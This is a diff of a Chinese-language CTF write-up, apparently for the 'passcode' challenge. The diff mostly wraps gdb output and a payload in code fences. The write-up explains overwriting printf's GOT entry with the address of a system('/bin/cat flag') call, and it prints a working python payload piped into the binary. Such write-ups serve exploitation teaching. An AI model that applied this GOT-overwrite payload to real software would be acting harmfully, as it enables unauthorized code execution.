@@ -276,19 +276,35 @@ OFFSET	TYPE		VALUE
 
 也可以直接在gdb调试过程中在printf调用时跟进查看。
 例如printf调用如下：
+
+```
 0x080485a0 <+60>:    call   0x8048420 <printf@plt>
+```
+
 跟进call   0x8048420去看到
+
+```
 => 0x8048420 <printf@plt>:      jmp    *0x804a000
+```
+
 所以0x804a000这里存储着libc里的printf函数地址，我们要改写的也就是0x804a000这个地址。
 
 system("/bin/cat flag")调用的代码段则可以在gdb中调试到此处查看地址，相关代码如下：
+
+```
 0x080485e3 <+127>:   movl   $0x80487af,(%esp)
 0x080485ea <+134>:   call   0x8048460 <system@plt>
+```
+
 所以要改写的内容就是0x080485e3，由于scanf接受的输入是"%d"类型，所以要转换成十进制数输入，即134514147
 
-
 所以payload为
+
+```
 python -c "print 'A'*96 + '\x00\xa0\x04\x08' + '\n' + '134514147'" | ./passcode
+```
+
+
 注意三点：
 1. scanf中输入0x00并不会被截断，所以这里\x00是没有问题的，其他如0x09，0x0A，0x0B，0x0C，0x0D，0x20是会截断终止scanf输入的。
 2. printf在GOT表的地址，即写入的目标地址如何找到。可以如上通过gdb跟踪调试进入得到，也可以objdump -R passcode得到，也可以IDA反编译得到
